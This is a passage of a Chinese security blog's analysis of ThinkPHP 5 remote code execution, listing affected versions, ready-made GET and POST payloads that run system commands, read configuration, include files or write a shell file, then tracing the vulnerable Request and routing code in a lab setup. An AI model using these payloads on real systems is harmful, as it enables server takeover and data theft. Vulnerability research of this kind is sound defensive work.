+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/770/">Thinkphp5 远程代码执行漏洞事件分析报告 (seebug.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-rce/">Thinkphp5 RCE总结 | Y4er的博客</a></p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li>ThinkPHP 5.0.5-5.0.22</li>
+<li>ThinkPHP 5.1.0-5.1.30</li>
+</ul>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>因为漏洞触发点和版本的不同，导致payload分为多种，其中一些payload需要取决于debug选项 比如直接访问路由触发的</p>
+<p>5.1.x ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p>5.0.x ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username &#x2F;&#x2F; 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    &#x2F;&#x2F; 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     &#x2F;&#x2F; 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index|think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][0]&#x3D;whoami</span><br></pre></td></tr></table></figure>
+
+<p>还有一种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;php.local&#x2F;thinkphp5.0.5&#x2F;public&#x2F;index.php?s&#x3D;index</span><br><span class="line">post</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;get[]&#x3D;phpinfo</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;GET&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<p>可以看到payload分为两种类型，一种是因为Request类的<code>method</code>和<code>__construct</code>方法造成的，另一种是因为Request类在兼容模式下获取的控制器没有进行合法校验，我们下面分两种来讲，然后会将thinkphp5的每个小版本都测试下找下可用的payload。</p>
+<h2 id="ThinkPHP-5-0-5-5-0-22"><a href="#ThinkPHP-5-0-5-5-0-22" class="headerlink" title="ThinkPHP 5.0.5-5.0.22"></a>ThinkPHP 5.0.5-5.0.22</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="http://www.thinkphp.cn/download/1015.html">http://www.thinkphp.cn/download/1015.html</a></p>
+<p>个人选择的版本是<code>5.0.10</code></p>
+<blockquote>
+<p>也可以使用<code>composer create-project topthink/think=5.0.10 tp5010 --prefer-dist</code>,但需要修改composer.json和<code>composer update</code></p>
+</blockquote>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;public&#x2F;index.php?s&#x3D;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post &#x2F;public&#x2F;index.php?s&#x3D;index</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;get[]&#x3D;phpinfo</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;GET&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username &#x2F;&#x2F; 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    &#x2F;&#x2F; 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     &#x2F;&#x2F; 包含任意.php文件</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.5&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line">?s&#x3D;index|think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][0]&#x3D;whoami</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://img.xzaslxr.xyz/image-20210223151156981.png" alt="image-20210223151156981"></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过查看手册可以得知tp5支持多种路由定义方式：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/118037">路由地址 · ThinkPHP5.0完全开发手册 · 看云 (kancloud.cn)</a></p>
+<p>路由地址表示定义的路由表达式最终需要路由到的地址以及一些需要的额外参数，支持下面5种方式定义：</p>
+<table>
+<thead>
+<tr>
+<th align="left">定义方式</th>
+<th align="left">定义格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">方式1：路由到模块/控制器</td>
+<td align="left">‘[模块/控制器/操作]?额外参数1=值1&amp;额外参数2=值2…’</td>
+</tr>
+<tr>
+<td align="left">方式2：路由到重定向地址</td>
+<td align="left">‘外部地址’（默认301重定向） 或者 [‘外部地址’,’重定向代码’]</td>
+</tr>
+<tr>
+<td align="left">方式3：路由到控制器的方法</td>
+<td align="left">‘@[模块/控制器/]操作’</td>
+</tr>
+<tr>
+<td align="left">方式4：路由到类的方法</td>
+<td align="left">‘\完整的命名空间类::静态方法’ 或者 ‘\完整的命名空间类@动态方法’</td>
+</tr>
+<tr>
+<td align="left">方式5：路由到闭包函数</td>
+<td align="left">闭包函数定义（支持参数传入）</td>
+</tr>
+</tbody></table>
+<p>这里值得注意的地方有两个，一个是路由定义方式4，tp5可以将请求路由到指定类的指定方法（必须是public方法）中；另一个是即使没有定义路由，tp5默认会按照方式1对URL进行解析调度。</p>
+<p>测试的payload为:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php?s=index</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.5</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.1.5</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.1.5/public/index.php?s=index</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh,en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=&amp;filter%5B%5D=system</span><br></pre></td></tr></table></figure>
+
+<p>thinkphp5  的一开始的加载顺序如下:</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223173352242.png" alt="image-20210223173352242"></p>
+<p>在app.php中,<code>$dispatch = self::routeCheck($request, $config);</code>为路由检查</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223173447869.png" alt="image-20210223173447869"></p>
+<p>具体的代码实现：<img src="http://img.xzaslxr.xyz/image-20210223162310793.png" alt="image-20210223162310793"></p>
+<p>由于没有在配置文件定义任何路由，所以默认按照方式1解析调度。如果开启强制路由模式，会直接抛出错误。根据<code>$result = Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]);</code>进入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thinkphp&#x2F;library&#x2F;think&#x2F;Route.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://img.xzaslxr.xyz/image-20210223163627195.png" alt="image-20210223163627195"></p>
+<p>可以看到tp5在解析URL的时候只是将URL按分割符分割，并没有进行安全检测。继续往后跟,我们回到App.run().</p>
+<p>在<code>self::exec()</code>为路由表达式的具体实现</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223173631154.png" alt="image-20210223173631154"></p>
+<p>具体代码大致如下:</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223173906362.png" alt="image-20210223173906362"></p>
+<p>接着进入<code>模块/控制器/操作</code>,并对<code>module</code>进行步入,而<code>module</code>的功能是将<code>result</code>依次转为<code>模块/控制器/操作</code>,最后会进入<code>invokeMethod</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223174240975.png" alt="image-20210223174240975"></p>
+<p><code>invokeMethod</code>会调用反射执行类的方法 、支持参数绑定,并进入<code>binParams</code></p>
+<blockquote>
+<p>从module开始,形式感觉有点像Java的反射</p>
+</blockquote>
+<p><img src="http://img.xzaslxr.xyz/image-20210223174438088.png" alt="image-20210223174438088"></p>
+<p><code>bindParams</code>，进行绑定参数,if判断后,进入<code>$vars = Request::instance()-&gt;param();</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223174758204.png" alt="image-20210223174758204"></p>
+<p>先<code>$vars = Request::instance()</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223175215752.png" alt="image-20210223175215752"></p>
+<p>后<code>param</code>,而<code>param</code>中有一个<code>$this-&gt;input</code>函数,且会将<code>post</code>参数赋值给<code>vars</code>数组</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223175415189.png" alt="image-20210223175415189"></p>
+<p>之后步入<code>input</code>函数</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223181721771.png" alt="image-20210223181721771"></p>
+<p>在<code>input</code>中,先<code>getFilter</code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223181807799.png" alt="image-20210223181807799"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter &#x3D; $this-&gt;filter #[&#39;system&#39;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://img.xzaslxr.xyz/image-20210223181908098.png" alt="image-20210223181908098"></p>
+<p>再步入进去到<code>filterValue</code></p>
+<blockquote>
+<p>array_walk_recursive — 对数组中的每个成员递归地应用用户函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;$sweet = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>);</span><br><span class="line">&gt;$fruits = <span class="keyword">array</span>(<span class="string">&#x27;sweet&#x27;</span> =&gt; $sweet, <span class="string">&#x27;sour&#x27;</span> =&gt; <span class="string">&#x27;lemon&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&gt;<span class="function"><span class="keyword">function</span> <span class="title">test_print</span>(<span class="params">$item, $key</span>)</span></span><br><span class="line"><span class="function">&gt;</span>&#123;</span><br><span class="line">&gt;<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$key</span> holds <span class="subst">$item</span>\n&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br><span class="line"></span><br><span class="line">&gt;array_walk_recursive($fruits, <span class="string">&#x27;test_print&#x27;</span>);</span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;a holds apple</span><br><span class="line">&gt;b holds banana</span><br><span class="line">&gt;sour holds lemon</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-walk-recursive.php">PHP: array_walk_recursive - Manual</a></p>
+</blockquote>
+<p><img src="http://img.xzaslxr.xyz/image-20210223175626111.png" alt="image-20210223175626111"></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223182825634.png" alt="image-20210223182825634"></p>
+<p>所以<code>value</code>为<code>whomai</code></p>
+<p>最终<code>call_user_func</code>回调函数执行payload</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223180020120.png" alt="image-20210223180020120"></p>
+<p>到这里还有一个问题,<code>$this-&gt;filter</code> 是什么时候发生变化的.</p>
+<blockquote>
+<p>个人认为,这里的构造和利用链比上面的<code>call_user_func</code>更有意思。</p>
+</blockquote>
+<p>首先需要关注的是<code>$this</code>指的是<code>Request</code>(<code>thinkphp/library/think/Request.php</code>)对象</p>
+<p>主要部分如下:</p>
+<p>当应用启动时,会进行URL路由检测</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223190414879.png" alt="image-20210223190414879"></p>
+<p>  路由检测（根据路由定义返回不同的URL调度）</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223190437197.png" alt="image-20210223190437197"></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223190509511.png" alt="image-20210223190509511"></p>
+<p>Method部分最为重要。</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223190529028.png" alt="image-20210223190529028"></p>
+<p>如图中断点处, </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;method &#x3D; strtoupper($_POST[Config::get(&#39;var_method&#39;)]);</span><br><span class="line">$this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>
+
+<p><code>Config::get(&#39;var_method&#39;)=_method </code></p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223190711429.png" alt="image-20210223190711429"></p>
+<p><code>$_POST[&#39;_method&#39;] = __construct</code></p>
+<p><code>$this-&gt;&#123;&#39;__construct&#39;&#125;($_POST);</code>调用构造函数,且<code>$_POST</code>为其值</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223190910594.png" alt="image-20210223190910594"></p>
+<blockquote>
+<p>property_exists — 检查对象或类是否具有该属性</p>
+</blockquote>
+<p>此时<code>this-&gt;method = &#39;&#39;,this-&gt;filter=[&#39;system&#39;]</code>,其中method最后return(其作用应该是消除对流程的影响)。</p>
+<p>再回到此处,可以发现<code>method</code>后面的作用是对<code>$rules</code>取值,对流程无影响</p>
+<p><img src="http://img.xzaslxr.xyz/image-20210223190509511.png" alt="image-20210223190509511"></p>
+<p>最后放七月火师傅一张流程图</p>
+<p><img src="http://img.xzaslxr.xyz/20191127228626.jpg" alt="image"></p>
+<p>其他分析:</p>
+<p>可以见y4er师傅的分析[强烈推荐]<a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-rce/">Thinkphp5 RCE总结 | Y4er的博客</a></p>
+<blockquote>
+<p>y4er yyds</p>
+</blockquote>
+<h1 id="反序列化漏洞-🕊鸽了"><a href="#反序列化漏洞-🕊鸽了" class="headerlink" title="反序列化漏洞 [🕊鸽了]"></a>反序列化漏洞 [🕊鸽了]</h1><h2 id="thinkphp5"><a href="#thinkphp5" class="headerlink" title="thinkphp5"></a>thinkphp5</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8143">TP5.0.xRCE&amp;5.0.24反序列化分析 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196364">ThinkPHP v5.0.x 反序列化利用链挖掘 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<h2 id="thinkphp6-1"><a href="#thinkphp6-1" class="headerlink" title="thinkphp6"></a>thinkphp6</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/12020777.html">ThinkPHP v6.0.x 反序列化漏洞利用 - ctrl_TT豆 - 博客园 (cnblogs.com)</a></p>
+<p>[ThinkPHP V6.0.x 反序列化漏洞 | WHOAMI’s Blog (whoamianony.top)](<a target="_blank" rel="noopener" href="https://whoamianony.top/2020/12/31/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/ThinkPHP">https://whoamianony.top/2020/12/31/漏洞复现/thinkphp/ThinkPHP</a> V6.0.x 反序列化漏洞/)</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://fe1w0.github.io">fe1w0</a>
+            <p>原文链接：<a href="https://fe1w0.github.io/2021/03/14/Thinkphp/">https://fe1w0.github.io/2021/03/14/Thinkphp/</a>
+            <p>发表日期：<a href="https://fe1w0.github.io/2021/03/14/Thinkphp/">March 14th 2021, 12:00:00 pm</a>
+            <p>更新日期：<a href="https://fe1w0.github.io/2021/03/14/Thinkphp/">March 15th 2021, 12:38:17 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/03/14/Fastjson/" title= "Fastjson 反序列化漏洞复现">
+                    <div class="nextTitle">Fastjson 反序列化漏洞复现</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/03/14/VulnStack-0x02/" title= "VulnStack_0x02">
+                    <div class="prevTitle">VulnStack_0x02</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC80ODYzMS8yNTEyNQ==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:xzasliuxinrong@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/xzlxr" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/xzlxr/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">环境搭建与基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">基础知识</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">任意文件操作漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp6"><span class="toc-number">2.1.</span> <span class="toc-text">thinkphp6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Debug%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">Debug配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.4.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">**任意代码执行漏洞 **</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-5-0-5-5-0-22"><span class="toc-number">3.1.</span> <span class="toc-text">ThinkPHP 5.0.5-5.0.22</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.1.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.3.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%F0%9F%95%8A%E9%B8%BD%E4%BA%86"><span class="toc-number">4.</span> <span class="toc-text">反序列化漏洞 [🕊鸽了]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp5"><span class="toc-number">4.1.</span> <span class="toc-text">thinkphp5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp6-1"><span class="toc-number">4.2.</span> <span class="toc-text">thinkphp6</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
